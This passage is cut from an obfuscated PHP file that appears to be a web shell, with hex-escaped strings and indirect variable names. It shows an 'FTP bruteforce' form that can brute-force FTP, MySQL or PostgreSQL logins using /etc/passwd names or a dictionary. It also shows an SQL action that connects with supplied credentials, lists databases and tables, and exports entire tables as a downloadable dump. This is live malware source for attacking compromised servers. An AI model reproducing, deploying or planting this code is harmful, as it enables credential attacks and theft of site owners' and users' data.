73p\x61n>\x20$attempts \x3c\x73\x70\x61\x6e>\x53\x75\x63c\x65\x73\x73:</\x73p\x61\x6e\x3e\x20$success\x3c/\x64iv\x3e\x3cb\x72\x3e";}echo"\x3c\x681>FT\x50\x20\x62\x72\x75\x74e\x66orce</h\x31>\x3c\x64i\x76\x20c\x6c\x61\x73\x73=c\x6f\x6eten\x74>\x3ctab\x6ce\x3e<\x66or\x6d\x20\x6de\x74h\x6fd=pos\x74><\x74\x72>\x3ctd>\x3c\x73p\x61\x6e>\x54ype</\x73\x70\x61n>\x3c/t\x64>"."\x3c\x74\x64>\x3c\x73\x65l\x65ct\x20\x6eame\x3d\x70\x72oto\x3e<\x6f\x70\x74i\x6f\x6e \x76a\x6c\x75\x65\x3df\x74\x70\x3e\x46\x54\x50</o\x70t\x69on>\x3co\x70t\x69o\x6e\x20v\x61lue=\x6dysq\x6c\x3e\x4d\x79S\x71l\x3c/opti\x6f\x6e>\x3cop\x74\x69o\x6e v\x61\x6cu\x65=p\x67\x73q\x6c>\x50o\x73\x74\x67r\x65Sq\x6c\x3c/op\x74i\x6f\x6e>\x3c/sele\x63t>\x3c/td>\x3c/t\x72><\x74\x72><\x74d\x3e"."<i\x6e\x70ut \x74\x79\x70\x65\x3d\x68\x69d\x64e\x6e\x20na\x6d\x65=c\x20\x76a\x6c\x75\x65=\"".htmlspecialchars($GLOBALS["cw\x64"])."\"\x3e"."\x3c\x69\x6e\x70u\x74 type=\x68i\x64\x64e\x6e\x20\x6e\x61\x6de\x3d\x61\x20\x76\x61\x6c\x75e=\x22".htmlspecialchars($_POST["a"])."\">"."<\x69np\x75\x74 ty\x70e=\x68\x69d\x64\x65n n\x61me\x3dc\x68a\x72\x73\x65\x74\x20\x76a\x6cu\x65=\"".htmlspecialchars($_POST["c\x68\x61\x72\x73et"])."\"\x3e"."\x3c\x73pa\x6e>\x53\x65r\x76er:po\x72\x74</\x73\x70\x61n\x3e\x3c/\x74\x64\x3e"."<td\x3e\x3c\x69np\x75t\x20\x74y\x70\x65=text\x20n\x61me\x3d\x73er\x76e\x72 v\x61\x6cue=\x22\x312\x37.0.0.\x31\x22\x3e</\x74\x64\x3e\x3c/tr>"."<\x74r>\x3c\x74\x64>\x3cs\x70an\x3eB\x72u\x74\x65\x20typ\x65</s\x70an\x3e\x3c/t\x64\x3e"."\x3c\x74d><\x6ca\x62el\x3e\x3c\x69n\x70\x75t \x74\x79pe\x3d\x72a\x64\x69o\x20\x6e\x61\x6de=\x74y\x70\x65 va\x6c\x75\x65\x3d\"1\" che\x63\x6bed\x3e\x20/\x65t\x63/\x70\x61sswd\x3c/\x6c\x61\x62\x65l>\x3c/\x74\x64>\x3c/\x74r>"."<\x74\x72><\x74\x64></\x74d>\x3ctd>\x3cl\x61\x62el \x73tyle=\x22p\x61dd\x69ng-\x6c\x65ft:\x315px\x22\x3e<i\x6ep\x75t \x74ype=\x63\x68\x65c\x6b\x62\x6fx\x20\x6e\x61me\x3d\x72ev\x65\x72\x73\x65 \x76\x61\x6cu\x65\x3d1\x20\x63\x68eck\x65\x64> rev\x65\x72s\x65 (l\x6f\x67\x69\x6e\x20-> nig\x6fl)\x3c/\x6c\x61\x62e\x6c\x3e</td>\x3c/\x74r\x3e"."<t\x72>\x3c\x74\x64\x3e</td\x3e\x3ctd\x3e\x3clab\x65l\x3e<\x69\x6e\x70ut \x74y\x70\x65=ra\x64io name=\x74y\x70e\x20\x76\x61lue=\"2\x22> Di\x63t\x69\x6fnar\x79\x3c/\x6ca\x62\x65l\x3e\x3c/t\x64>\x3c/tr>"."<\x74r\x3e<\x74d>\x3c/\x74\x64\x3e\x3c\x74d>\x3c\x74\x61b\x6c\x65\x20\x73\x74\x79l\x65\x3d\"p\x61d\x64ing-le\x66\x74:\x31\x35\x70\x78\"><\x74r\x3e<t\x64>\x3c\x73pa\x6e>\x4cog\x69\x6e</\x73\x70a\x6e></td>"."<td>\x3c\x69npu\x74 \x74yp\x65=\x74e\x78t n\x61me\x3dlogi\x6e\x20\x76\x61l\x75e\x3d\x22\x6bom\x73e\x6e\x22>\x3c/\x74d></tr>"."<\x74r>\x3c\x74\x64>\x3c\x73pa\x6e>\x44\x69c\x74\x69ona\x72y</\x73pan\x3e\x3c/\x74d\x3e"."<t\x64\x3e<i\x6eput\x20\x74\x79\x70\x65=text name\x3ddic\x74 \x76al\x75e=\x22".htmlspecialchars($GLOBALS["c\x77d"])."pas\x73\x77\x64\x2e\x64i\x63\"\x3e\x3c/\x74\x64>\x3c/\x74r></\x74\x61b\x6ce\x3e"."</td\x3e</t\x72>\x3ct\x72\x3e<td\x3e</td>\x3c\x74d\x3e\x3cin\x70\x75t\x20\x74y\x70e\x3d\x73\x75\x62\x6d\x69\x74\x20va\x6c\x75\x65\x3d\"\x3e>\"></t\x64\x3e</tr>\x3c/\x66\x6f\x72\x6d></t\x61b\x6ce>";echo"</\x64iv><b\x72>";printFooter();}function actionSql(){$owhxdrp="\x64\x62";class DbClass{var$type;var$link;var$res;function DbClass($type){$this->type=${${"\x47\x4c\x4fB\x41LS"}["\x65\x77\x66\x62\x71\x62d\x7al"]};}function connect($host,$user,$pass,$dbname){switch($this->type){case"mysql":if($this->link=@mysql_connect($host,${${"\x47\x4cO\x42\x41LS"}["\x77n\x6b\x79c\x6d\x71"]},${${"\x47\x4c\x4fBA\x4c\x53"}["ce\x68k\x6a\x70e\x64"]},true))return true;break;case"\x70gsql":$host=explode(":",$host);if(!$host[1])$host[1]=5432;if($this->link=@pg_connect("hos\x74\x3d{$host[0]} \x70\x6fr\x74\x3d{$host[1]} \x75\x73\x65r=$user pas\x73wo\x72d\x3d$pass db\x6eame=$dbname"))return true;break;}return false;}function selectdb($db){$kzdogk="\x64b";switch($this->type){case"\x6d\x79\x73ql":if(@mysql_select_db(${$kzdogk}))return true;break;}return false;}function query($str){${"GL\x4f\x42\x41\x4c\x53"}["\x74\x62q\x78\x6bfj"]="\x73\x74r";switch($this->type){case"\x6d\x79sq\x6c":return$this->res=@mysql_query(${${"\x47L\x4fB\x41LS"}["tbqx\x6b\x66\x6a"]});break;case"\x70\x67s\x71\x6c":return$this->res=@pg_query($this->link,${${"G\x4cOB\x41L\x53"}["\x65\x69\x77\x6e\x71\x74\x68\x6a"]});break;}return false;}function fetch(){${${"G\x4c\x4fB\x41\x4c\x53"}["\x63e\x6er\x6dl\x64"]}=func_num_args()?func_get_arg(0):$this->res;${"\x47L\x4fB\x41\x4c\x53"}["\x73\x71f\x66\x69e\x77"]="\x72\x65\x73";switch($this->type){case"mys\x71l":return@mysql_fetch_assoc(${${"G\x4c\x4f\x42\x41\x4c\x53"}["\x63\x65\x6e\x72\x6d\x6c\x64"]});break;case"\x70\x67s\x71l":return@pg_fetch_assoc(${${"\x47L\x4f\x42AL\x53"}["\x73qf\x66\x69\x65w"]});break;}return false;}function listDbs(){switch($this->type){case"m\x79sql":return$this->res=@mysql_list_dbs($this->link);break;case"p\x67\x73\x71l":return$this->res=$this->query("S\x45L\x45\x43T\x20\x64\x61tn\x61m\x65 F\x52\x4fM \x70\x67\x5f\x64\x61t\x61ba\x73e");break;}return false;}function listTables(){switch($this->type){case"\x6d\x79\x73ql":return$this->res=$this->query("S\x48O\x57 \x54A\x42\x4cES");break;case"\x70g\x73\x71l":return$this->res=$this->query("\x73\x65l\x65\x63t t\x61\x62\x6c\x65_n\x61\x6d\x65\x20fr\x6f\x6d\x20i\x6efo\x72m\x61\x74\x69\x6fn\x5f\x73che\x6d\x61\x2e\x74a\x62le\x73\x20\x77\x68e\x72\x65 (t\x61ble_sc\x68\x65\x6da !\x3d '\x69\x6ef\x6fr\x6d\x61\x74\x69\x6fn_\x73\x63h\x65ma\x27 AN\x44 ta\x62\x6c\x65\x5f\x73\x63hem\x61\x20!\x3d\x20\x27pg_\x63\x61talog')\x20\x6f\x72\x20\x74\x61b\x6c\x65_na\x6d\x65 \x3d\x20'pg\x5f\x75se\x72\x27");break;}return false;}function error(){switch($this->type){case"m\x79\x73\x71\x6c":return@mysql_error($this->link);break;case"pgsql":return@pg_last_error($this->link);break;}return false;}function setCharset($str){$tyxfkejgqyvq="\x73t\x72";$spjifinxhwuo="s\x74\x72";switch($this->type){case"\x6d\x79s\x71\x6c":if(function_exists("m\x79\x73\x71l_\x73e\x74_c\x68ars\x65t"))return@mysql_set_charset(${$spjifinxhwuo},$this->link);else$this->query("\x53\x45\x54 CHARS\x45\x54\x20".${${"\x47\x4cOB\x41L\x53"}["e\x69wn\x71\x74h\x6a"]});break;case"\x6d\x79\x73\x71\x6c":return@pg_set_client_encoding($this->link,${$tyxfkejgqyvq});break;}return false;}function dump($table){${"GL\x4fB\x41\x4c\x53"}["\x64\x76\x77ki\x77e\x66"]="\x69t\x65\x6d";$rhuayapqy="r\x65\x73";$oxmuqjwpy="\x69tem";switch($this->type){case"\x6d\x79\x73\x71l":${$rhuayapqy}=$this->query("\x53\x48O\x57 C\x52\x45AT\x45\x20T\x41BLE \x60".${${"GLO\x42\x41L\x53"}["\x6e\x65\x72\x73\x73t\x75"]}."`");${${"\x47LO\x42\x41\x4c\x53"}["uuw\x63v\x7a\x7a\x64"]}=mysql_fetch_array(${${"\x47\x4c\x4f\x42\x41L\x53"}["ce\x6ermld"]});echo${${"G\x4c\x4fBA\x4cS"}["\x75uwc\x76z\x7a\x64"]}[1].";\n\n";$this->query("\x53\x45LE\x43T\x20*\x20\x46ROM \x60".${${"GLO\x42A\x4c\x53"}["\x6e\x65\x72s\x73\x74\x75"]}."\x60");while(${${"\x47LOB\x41L\x53"}["dvw\x6bi\x77ef"]}=$this->fetch()){${"\x47L\x4f\x42\x41\x4c\x53"}["\x79i\x78qyvj\x68\x67ne"]="c\x6f\x6c\x75\x6d\x6es";$dqspytuk="\x76";${"GL\x4fB\x41LS"}["\x72\x71\x6cc\x63\x78w\x6f\x74\x70"]="k";${${"G\x4cO\x42\x41\x4c\x53"}["\x79\x69\x78\x71\x79vj\x68\x67\x6e\x65"]}=array();$ogpjebucz="\x74\x61\x62\x6ce";$qzhyycuf="\x69\x74\x65\x6d";${"\x47\x4c\x4fB\x41L\x53"}["\x72jggb\x67\x65\x73g"]="\x63\x6fl\x75\x6dn\x73";foreach(${${"\x47\x4c\x4fB\x41\x4cS"}["\x6e\x76\x66ll\x61\x6d\x66s"]} as${${"\x47\x4cOB\x41\x4c\x53"}["\x72\x71\x6c\x63cxw\x6f\x74\x70"]}=>${$dqspytuk}){${"\x47\x4c\x4f\x42A\x4c\x53"}["\x62\x72m\x6d\x63\x73"]="\x63\x6f\x6c\x75\x6dns";${"G\x4cO\x42\x41\x4cS"}["\x6c\x73\x6er\x69e\x63\x71m\x77"]="\x6b";$nwvdiqnlyvm="\x76";${"\x47L\x4fBALS"}["\x61\x6c\x67j\x74\x6f\x66n"]="\x6b";${"\x47L\x4fB\x41\x4cS"}["\x66\x72z\x73\x76w"]="i\x74e\x6d";${${"\x47\x4c\x4fB\x41\x4cS"}["\x66\x72z\x73\x76w"]}[${${"\x47\x4cO\x42\x41L\x53"}["\x61\x6c\x67j\x74\x6f\x66\x6e"]}]="'".@mysql_real_escape_string(${$nwvdiqnlyvm})."\x27";${${"\x47\x4cO\x42A\x4cS"}["b\x72m\x6dcs"]}[]="`".${${"G\x4c\x4f\x42\x41\x4cS"}["\x6c\x73\x6e\x72i\x65\x63q\x6dw"]}."\x60";}echo"IN\x53E\x52\x54\x20\x49NTO `".${$ogpjebucz}."\x60 (".implode(", ",${${"GL\x4fB\x41\x4c\x53"}["\x72jg\x67\x62\x67\x65\x73\x67"]}).") VALUES\x20(".implode(",\x20",${$qzhyycuf}).")\x3b"."\n";}break;case"p\x67s\x71\x6c":$this->query("\x53\x45L\x45CT\x20* FR\x4fM ".${${"GL\x4f\x42\x41\x4c\x53"}["ne\x72\x73\x73\x74\x75"]});while(${$oxmuqjwpy}=$this->fetch()){$rclujwhut="\x69\x74\x65m";$aluzrioiskly="\x76";${${"\x47\x4c\x4f\x42A\x4cS"}["\x71\x70\x6a\x74\x66\x6a"]}=array();foreach(${$rclujwhut} as${${"\x47L\x4fBA\x4cS"}["\x73\x72\x7ax\x64k\x7a\x64\x72w\x6b\x77"]}=>${$aluzrioiskly}){${"\x47L\x4f\x42A\x4c\x53"}["o\x75fe\x6bu\x6e\x63wx"]="\x6b";${"G\x4c\x4f\x42AL\x53"}["v\x67\x79\x67f\x71t\x64s"]="v";${${"\x47L\x4f\x42\x41\x4c\x53"}["\x6evf\x6c\x6c\x61m\x66\x73"]}[${${"\x47\x4c\x4f\x42A\x4cS"}["o\x75\x66e\x6b\x75\x6ec\x77x"]}]="'".addslashes(${${"\x47L\x4fB\x41\x4c\x53"}["vgy\x67f\x71\x74\x64\x73"]})."'";${${"G\x4c\x4fB\x41\x4cS"}["\x71pjt\x66j"]}[]=${${"\x47\x4cO\x42\x41\x4cS"}["\x73\x72\x7ax\x64kzd\x72w\x6b\x77"]};}echo"IN\x53\x45\x52T \x49NTO\x20".${${"\x47\x4cO\x42ALS"}["\x6eer\x73\x73tu"]}." (".implode(",\x20",${${"\x47\x4cO\x42\x41\x4c\x53"}["\x71\x70j\x74\x66j"]}).") \x56\x41\x4c\x55ES\x20(".implode(", ",${${"G\x4c\x4f\x42\x41\x4c\x53"}["\x6ev\x66lla\x6d\x66s"]}).")\x3b"."\n";}break;}return false;}}${$owhxdrp}=new DbClass($_POST["\x74yp\x65"]);if(@$_POST["\x702"]=="\x64\x6fwnlo\x61d"){ob_start("\x6f\x62_\x67\x7a\x68\x61n\x64le\x72",4096);$db->connect($_POST["\x73\x71l_\x68\x6f\x73\x74"],$_POST["sql_\x6c\x6f\x67\x69\x6e"],$_POST["sql_p\x61\x73\x73"],$_POST["\x73ql\x5f\x62\x61s\x65"]);$igompndrnok="v";$db->selectdb($_POST["s\x71\x6c\x5fba\x73\x65"]);header("C\x6f\x6et\x65n\x74-Dispo\x73\x69\x74io\x6e: \x61\x74\x74a\x63\x68m\x65n\x74;\x20fi\x6ce\x6eam\x65\x3d\x64\x75m\x70.\x73ql");header("C\x6f\x6eten\x74-\x54y\x70\x65: t\x65xt/\x70\x6cai\x6e");foreach($_POST["tb\x6c"]as${${"G\x4cOBAL\x53"}["\x64\x77wqw\x6f\x79\x69\x78q\x70"]})$db->dump(${$igompndrnok});exit;}printHeader();echo "